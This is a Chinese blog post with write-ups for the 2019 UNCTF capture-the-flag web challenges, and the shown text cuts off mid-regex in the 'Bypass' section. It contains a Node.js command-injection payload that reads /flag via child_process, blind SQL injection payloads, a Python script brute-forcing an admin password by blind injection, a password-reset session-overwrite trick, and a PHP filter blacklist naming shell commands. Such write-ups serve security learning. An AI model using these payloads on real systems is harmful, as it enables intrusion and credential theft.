<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <title>2019 UNCTF | Van1sh的小屋</title>
  <meta name="keywords" content=" Write Up ">
  <meta name="description" content="2019 UNCTF | Van1sh的小屋">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="It is not ignorance and weakness but arrogance that destroys mankind">
<meta property="og:type" content="website">
<meta property="og:title" content="Van1sh的小屋">
<meta property="og:url" content="http://jayxv.github.io/tags/index.html">
<meta property="og:site_name" content="Van1sh的小屋">
<meta property="og:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-07-14T07:59:52.318Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Van1sh的小屋">
<meta name="twitter:description" content="It is not ignorance and weakness but arrogance that destroys mankind">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/sublime.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>

<script src="/js/iconfont.js?v=1.0.1"></script>

</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value>
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>Van1sh</span>
</div>

<div class="icon">
    
        
    
        
        <a title="github" href="https://github.com/JayxV" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-github"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
        <a title="email" href="mailto:643713081@qq.com" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-email"></use>
                </svg>
            
        </a>
        
    
        
        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=643713081&site=qq&menu=yes" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-qq"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
</div>




<ul>
    <li><div class="all active">全部文章<small>(23)</small></div></li>
    
        
            
            <li><div data-rel="比赛小屋">比赛小屋<small>(8)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="工具小屋">工具小屋<small>(4)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="密码小屋"><i class="fold iconfont icon-right"></i>密码小屋<small>(8)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="ECC">ECC<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Paillier">Paillier<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Lattice">Lattice<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Stream">Stream<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Rsa">Rsa<small>(2)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Block">Block<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Basic">Basic<small>(1)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
            <li><div data-rel="私人小屋">私人小屋<small>(1)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="小书屋">小书屋<small>(1)</small></div>
                
            </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    </div>
    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="23">
<input type="hidden" id="yelog_site_word_count" value="93.4k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        友情链接
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="http://www.fzwjscj.xyz/">fzwjscj</a></li>
            
            <li><a target="_blank" href="http://dldxz.cn/">DLDXZ</a></li>
            
            <li><a target="_blank" href="http://fanda.cloud/">fanda</a></li>
            
            <li><a target="_blank" href="http://passingfoam.com/">PassingFoam&#39;s blog</a></li>
            
            <li><a target="_blank" href="https://eqqie.cn/">赤道企鹅</a></li>
            
            <li><a target="_blank" href="http://blog.ragdoll.work/">咲夜南梦</a></li>
            
            <li><a target="_blank" href="https://www.zhaoj.in/">glzjin</a></li>
            
            <li><a target="_blank" href="https://coinc1dens.github.io/">Coinc1dens</a></li>
            
            <li><a target="_blank" href="http://blog.soreatu.com/">soreatu</a></li>
            
            <li><a target="_blank" href="http://www.ga1axy.top/">盖乐希</a></li>
            
            <li><a target="_blank" href="https://shawroot.cc/">Root.</a></li>
            
            <li><a target="_blank" href="https://l1near.top/">l1near</a></li>
            
            <li><a target="_blank" href="https://0xdktb.top/">0xDktb</a></li>
            
            <li><a target="_blank" href="https://www.wootec.top/">Reverier</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode === 13){return false;}">
        <input id="local-search-input" class="search" type="text" placeholder="以 in: 开头进行全文搜索" />
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a class="color4">Write Up</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">docker</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">ECC</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Paillier</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">Lattice</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Dsa</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">LCG</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Rc4</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">SM4</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Rsa</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">python</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">操作模式</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">Abstract algebra</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">private</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">Nmap</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">Linux</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">book</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        <a id="top" class=""
           href="/2020/05/03/待办事项/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Van1sh 的 待办事项">Van1sh 的 待办事项</span>
            <span class="post-date" title="2020-05-03 13:18:35">2020/05/03</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/10/2020网鼎杯/"
           data-tag="Write Up"
           data-author="" >
            <span class="post-title" title="2020 网鼎杯">2020 网鼎杯</span>
            <span class="post-date" title="2020-05-10 21:15:00">2020/05/10</span>
        </a>
        
        <a  class="密码小屋 Lattice "
           href="/2020/05/09/密码学学习笔记之HNP/"
           data-tag="Lattice,Dsa,LCG"
           data-author="" >
            <span class="post-title" title="密码学学习笔记 之 HNP">密码学学习笔记 之 HNP</span>
            <span class="post-date" title="2020-05-09 15:05:00">2020/05/09</span>
        </a>
        
        <a  class="密码小屋 Paillier "
           href="/2020/05/08/密码学学习笔记之 paillier cryptosystem/"
           data-tag="Paillier"
           data-author="" >
            <span class="post-title" title="密码学学习笔记 之 paillier cryptosystem">密码学学习笔记 之 paillier cryptosystem</span>
            <span class="post-date" title="2020-05-08 12:05:00">2020/05/08</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/05/2020De1CTF/"
           data-tag="Write Up"
           data-author="" >
            <span class="post-title" title="2020 De1CTF">2020 De1CTF</span>
            <span class="post-date" title="2020-05-05 15:57:00">2020/05/05</span>
        </a>
        
        <a  class="密码小屋 ECC "
           href="/2020/05/05/密码学学习笔记之NCCIP/"
           data-tag="ECC"
           data-author="" >
            <span class="post-title" title="密码学学习笔记 之 NCCIP">密码学学习笔记 之 NCCIP</span>
            <span class="post-date" title="2020-05-05 12:05:00">2020/05/05</span>
        </a>
        
        <a  class="密码小屋 Block "
           href="/2020/03/03/密码学学习笔记之分组密码操作模式/"
           data-tag="操作模式"
           data-author="" >
            <span class="post-title" title="密码学学习笔记 之 分组密码操作模式">密码学学习笔记 之 分组密码操作模式</span>
            <span class="post-date" title="2020-03-03 15:15:00">2020/03/03</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/02/18/2020hgame_week1/"
           data-tag="Write Up"
           data-author="" >
            <span class="post-title" title="2020 hgame week1">2020 hgame week1</span>
            <span class="post-date" title="2020-02-18 16:22:35">2020/02/18</span>
        </a>
        
        <a  class="密码小屋 Stream "
           href="/2020/01/30/密码学学习笔记之RC4与SM4/"
           data-tag="Rc4,SM4"
           data-author="" >
            <span class="post-title" title="密码学学习笔记 之 RC4与SM4">密码学学习笔记 之 RC4与SM4</span>
            <span class="post-date" title="2020-01-30 00:05:00">2020/01/30</span>
        </a>
        
        <a  class="密码小屋 Rsa "
           href="/2019/12/04/密码学学习笔记之浅析On r-th Root Extraction Algorithm in Fq/"
           data-tag="Rsa"
           data-author="" >
            <span class="post-title" title="密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq">密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq</span>
            <span class="post-date" title="2019-12-04 15:45:00">2019/12/04</span>
        </a>
        
        <a  class="密码小屋 Rsa "
           href="/2019/11/11/密码学学习笔记之浅析Pollard's rho algorithm及其应用/"
           data-tag="Rsa"
           data-author="" >
            <span class="post-title" title="密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用">密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用</span>
            <span class="post-date" title="2019-11-11 15:32:00">2019/11/11</span>
        </a>
        
        <a  class="密码小屋 Basic "
           href="/2019/11/11/密码学学习笔记之数论四大定理及应用/"
           data-tag="Abstract algebra"
           data-author="" >
            <span class="post-title" title="密码学学习笔记 之 数论四大定理及应用">密码学学习笔记 之 数论四大定理及应用</span>
            <span class="post-date" title="2019-11-11 15:30:00">2019/11/11</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/11/11/2019UNCTF/"
           data-tag="Write Up"
           data-author="" >
            <span class="post-title" title="2019 UNCTF">2019 UNCTF</span>
            <span class="post-date" title="2019-11-11 15:12:35">2019/11/11</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/11/01/docker和docker-compose的安装/"
           data-tag="docker"
           data-author="" >
            <span class="post-title" title="安装Docker 和 Docker-Compose以及docker images的制作及上传">安装Docker 和 Docker-Compose以及docker images的制作及上传</span>
            <span class="post-date" title="2019-11-01 21:00:00">2019/11/01</span>
        </a>
        
        <a  class="私人小屋 "
           href="/2019/10/01/是某个失眠的夜晚/"
           data-tag="private"
           data-author="" >
            <span class="post-title" title="是某个失眠的夜晚">是某个失眠的夜晚</span>
            <span class="post-date" title="2019-10-01 00:42:35">2019/10/01</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/09/12/Linux 基基基基基基础/"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Linux 基基基基基基础">Linux 基基基基基基础</span>
            <span class="post-date" title="2019-09-12 00:17:00">2019/09/12</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/29/2019第五空间/"
           data-tag="Write Up"
           data-author="" >
            <span class="post-title" title="2019 第五空间">2019 第五空间</span>
            <span class="post-date" title="2019-08-29 12:18:35">2019/08/29</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/27/2019OGeek/"
           data-tag="Write Up"
           data-author="" >
            <span class="post-title" title="2019 OGeek">2019 OGeek</span>
            <span class="post-date" title="2019-08-27 11:02:35">2019/08/27</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/03/2019De1CTF/"
           data-tag="Write Up"
           data-author="" >
            <span class="post-title" title="2019 De1CTF">2019 De1CTF</span>
            <span class="post-date" title="2019-08-03 22:14:55">2019/08/03</span>
        </a>
        
        <a  class="小书屋 "
           href="/2019/08/02/三体/"
           data-tag="book"
           data-author="" >
            <span class="post-title" title="三体">三体</span>
            <span class="post-date" title="2019-08-02 12:56:00">2019/08/02</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/07/22/nmap/"
           data-tag="Nmap"
           data-author="" >
            <span class="post-title" title="初遇Nmap">初遇Nmap</span>
            <span class="post-date" title="2019-07-22 16:07:55">2019/07/22</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/07/21/python 正则/"
           data-tag="python"
           data-author="" >
            <span class="post-title" title="python 之 正则">python 之 正则</span>
            <span class="post-date" title="2019-07-21 22:30:35">2019/07/21</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/07/14/2019赛博杯/"
           data-tag="Write Up"
           data-author="" >
            <span class="post-title" title="2019 赛博杯">2019 赛博杯</span>
            <span class="post-date" title="2019-07-14 16:22:35">2019/07/14</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-2019UNCTF" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">2019 UNCTF</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            
                <a  data-rel="比赛小屋">比赛小屋</a>
            
        </span>
        
        
        <span class="tag">
            
            <a class="color4">Write Up</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title='更新时间: 2020-05-01 00:08:03'>2019-11-11 15:12</time>
        
    </div>
    <div class="article-meta">
        
        <span>字数:4.2k</span>
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#帮赵总征婚"><span class="toc-text">帮赵总征婚</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的备忘录"><span class="toc-text">简单的备忘录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin"><span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Twice-Insert"><span class="toc-text">Twice_Insert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSB-Reset-Password"><span class="toc-text">NSB Reset Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-admin"><span class="toc-text">easy_admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#审计一下世界上最好的语言吧"><span class="toc-text">审计一下世界上最好的语言吧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#666"><span class="toc-text">666</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#神奇的数组"><span class="toc-text">神奇的数组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyXor"><span class="toc-text">BabyXor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unctfeasyMaze"><span class="toc-text">unctfeasyMaze</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信号不好我先走了"><span class="toc-text">信号不好我先走了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#亲爱的"><span class="toc-text">亲爱的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#快乐游戏题"><span class="toc-text">快乐游戏题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Happy-Puzzle"><span class="toc-text">Happy Puzzle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#think"><span class="toc-text">think</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hidden-secret"><span class="toc-text">Hidden secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyBox"><span class="toc-text">EasyBox</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#不仅仅是RSA"><span class="toc-text">不仅仅是RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一句话加密"><span class="toc-text">一句话加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ECC和AES基础"><span class="toc-text">ECC和AES基础</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sosoeasypwn"><span class="toc-text">Sosoeasypwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyShellcode"><span class="toc-text">EasyShellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-rop"><span class="toc-text">easy rop</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>原文发表于<a href="https://www.anquanke.com/post/id/190613" target="_blank" rel="noopener">安全客</a></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="帮赵总征婚"><a href="#帮赵总征婚" class="headerlink" title="帮赵总征婚"></a>帮赵总征婚</h3><p>呃，帮不了赵总征婚~。</p>
<p>f12，有个hint：<code>&lt;!-- I like rockyou! --&gt;</code></p>
<p>上rockyou字典（不可能的，bp会炸，上top3000），直接爆，得到flag</p>
<p><a href="https://p5.ssl.qhimg.com/t01fe0b0209adb8549f.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01fe0b0209adb8549f.png" alt="img"></a></p>
<p>得到flag：flag{57fc636a42f46c7658110a631256f5cb}</p>
<h3 id="简单的备忘录"><a href="#简单的备忘录" class="headerlink" title="简单的备忘录"></a>简单的备忘录</h3><p>emmm，没学过的语言，进去各种fuzz，</p>
<p>发现打一个字母他就会给些选择</p>
<p><a href="https://p5.ssl.qhimg.com/t01b556d8884c351425.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01b556d8884c351425.png" alt="img"></a></p>
<p>最后随缘整出flag</p>
<p><a href="https://p3.ssl.qhimg.com/t01a82e3b736dd6d396.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01a82e3b736dd6d396.png" alt="img"></a></p>
<p>flag{3ad4aaedf408c147d5f747f7ce76d2b4}</p>
<h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>进入是个聊天框，/name 改名字</p>
<p>/flag 会打印flag1flag1flag1….</p>
<p>/more 显示/flag – 小伙子…</p>
<p>/calc 可以计算，（猜测这里可能有命令执行）</p>
<p><a href="https://p5.ssl.qhimg.com/t01c07d61198ccbf3c5.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01c07d61198ccbf3c5.png" alt="img"></a></p>
<p>找到篇文章<a href="https://m.jb51.net/article/91411.htm`" target="_blank" rel="noopener">https://m.jb51.net/article/91411.htm`</a></p>
<p>于是试了试里面的payload：/calc require(‘child_process’).exec(‘ls’).toString()</p>
<p>返回了：血小板: [object Object]</p>
<p>然后试了试execSync：/calc require(‘child_process’).execSync(‘ls’).toString()</p>
<p>返回了：bin games include lib local sbin share src命令执行成功</p>
<p>于是读取flag：/calc require(‘child_process’).execSync(‘cat /flag’).toString()</p>
<p>返回：血小板: undefined</p>
<p>应该是空格的问题，那就用$IFS替代：/calc require(‘child_process’).execSync(‘cat$IFS/flag’).toString()</p>
<p>成功拿到flag</p>
<p><a href="https://p3.ssl.qhimg.com/t015673743622d5d679.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t015673743622d5d679.png" alt="img"></a></p>
<p>flag{0e4d1980ef6f8a81428f83e8e1c6e22b}</p>
<h3 id="Twice-Insert"><a href="#Twice-Insert" class="headerlink" title="Twice_Insert"></a>Twice_Insert</h3><p>刚开始还以为是原题，注册admin’#后改密码，然后用admin登录，发现并没有flag（可恶呢</p>
<p>但是，既然这个二次注入点还在，那仍然是可以被拿来利用的</p>
<p>在单引号和#中间就可以注入语句</p>
<p>各种fuzz后，发现很多函数都被waf了（smarter…harder…大概是有回显的盲注了）</p>
<p>最后，发现了这篇文章<a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</a></p>
<p><a href="https://p1.ssl.qhimg.com/t017ee419351442a907.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t017ee419351442a907.png" alt="img"></a></p>
<p>于是试着构造payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"admin' and ascii(substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">distinct</span> database_name)<span class="keyword">from</span> mysql.innodb_index_stats),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">30</span><span class="comment">###vanish"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"admin' and ascii(substr((select group_concat(distinct table_name)from mysql.innodb_index_stats),1,1))=30###vanish"</span></span><br></pre></td></tr></table></figure>

<p>然后写一个自动化脚本。不断地注册，登录，改密码，然后根据回显按位爆破库、表即可</p>
<p>最终的payload：”admin’ and ascii(substr((select * from fl4g),%d,1))=%d###vanish”%(i,j)</p>
<p><a href="https://p1.ssl.qhimg.com/t0140ff12ae8dcf0041.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0140ff12ae8dcf0041.png" alt="img"></a></p>
<p>得到flag：UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}（不知道为啥，开头有时候会缺）</p>
<h3 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB Reset Password"></a>NSB Reset Password</h3><p>注册-&gt;改密码：发验证码-&gt;重置密码</p>
<p>三个包抓过来，发现sessionID都没有变动过。</p>
<p>试着猜想这个改密码的逻辑：当我给自己的账户发邮件，然后输入验证码，验证通过后，这个sessionID就获得了更改密码的权利，但是是更改谁的密码呢？账户的信息想必是存在sessionID里的。</p>
<p>但经过测验，无论是给admin发邮件，还是给自己发邮件，sessionID都没有变过。那么，显然sessionID里的储存的账户信息的那部分是可以被覆盖的，所以解题流程：</p>
<p>先注册-&gt;更改密码：发送验证码-&gt;到重置密码的界面，此时再开一个窗口，发送更改admin密码的邮件（sessionID里的用户被覆盖为admin），然后又回去，更改密码（此时更改的就是sessionID里的账户，即admin的密码），然后用自己更改的密码登录admin账户即可获flag</p>
<p><a href="https://p5.ssl.qhimg.com/t01ba8c30adb43d2d38.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01ba8c30adb43d2d38.png" alt="img"></a></p>
<p>flag：flag{175f3098f80735ddfdfbd4588f6b1082}</p>
<h3 id="easy-admin"><a href="#easy-admin" class="headerlink" title="easy_admin"></a>easy_admin</h3><p>很容易发现在/index.php?file=forget这里存在注入</p>
<p>fuzz后发现过滤了and select where。。。</p>
<p>然后卡了好久不知道怎么查admin的密码，最后索性直接 password （bugku有一道过滤很严的题就是这样bypass，）</p>
<p>exp：</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10045/index.php?file=forget"</span></span><br><span class="line"></span><br><span class="line">r = requests.Session()</span><br><span class="line"></span><br><span class="line">password=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="built_in">in</span> range(ord(<span class="string">'0'</span>),ord(<span class="string">'&#125;'</span>)):</span><br><span class="line">        <span class="keyword">data</span> = &#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"-1'or ascii(substr((password),%d,1))=%d#"</span>%(i,j)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = r.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">        #print res.<span class="keyword">text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"ok reset password"</span> <span class="built_in">in</span> res.<span class="keyword">text</span>:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            print password</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>得到密码：</p>
<p><a href="https://p1.ssl.qhimg.com/t01276c1041f642fd59.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01276c1041f642fd59.png" alt="img"></a></p>
<p>登录后yes you are admin, but you can’ to get the flag, because admin will access the website from</p>
<p>from where？</p>
<p>盲猜是127.0.0.1，然后再报文头加一个Referer，得到后一半flag</p>
<p><a href="https://p4.ssl.qhimg.com/t01cf6314a828f8eeed.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01cf6314a828f8eeed.png" alt="img"></a></p>
<p>flag：flag{nevertoolatetox}</p>
<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>php的正则有点小漏洞，两个斜杠丢进php只剩一个斜杠了，然后这个斜杠丢进正则就用来转义了</p>
<p>而这一题，出题人似乎是给了个hint</p>
<p><a href="https://p3.ssl.qhimg.com/t01b0ca65aa5a902b40.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01b0ca65aa5a902b40.png" alt="img"></a></p>
<p>这里故意换了下位置。</p>
<p>所以自己做了下实验，发现，由于这个小漏洞，a被过滤了|<em>而不是</em>，b被过滤了|\n，而不是被过滤了\n</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>['a'];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>['b'];</span><br><span class="line"><span class="comment">// try bypass it</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"</span>|,|;|\`|\\|\*|\<span class="keyword">n</span>|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\<span class="keyword">d</span>]|@|\||tail|bin|less|<span class="keyword">more</span>|string|<span class="keyword">nl</span>|<span class="keyword">pwd</span>|<span class="keyword">cat</span>|<span class="keyword">sh</span>|flag|find|<span class="keyword">ls</span>|grep|echo|w/is", <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">""</span>;</span><br><span class="line">    echo<span class="string">"waf-a\n"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"</span>|;|,|\`|\*|\\|\<span class="keyword">n</span>|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\<span class="keyword">d</span>]|@|\||tail|bin|less|<span class="keyword">more</span>|string|<span 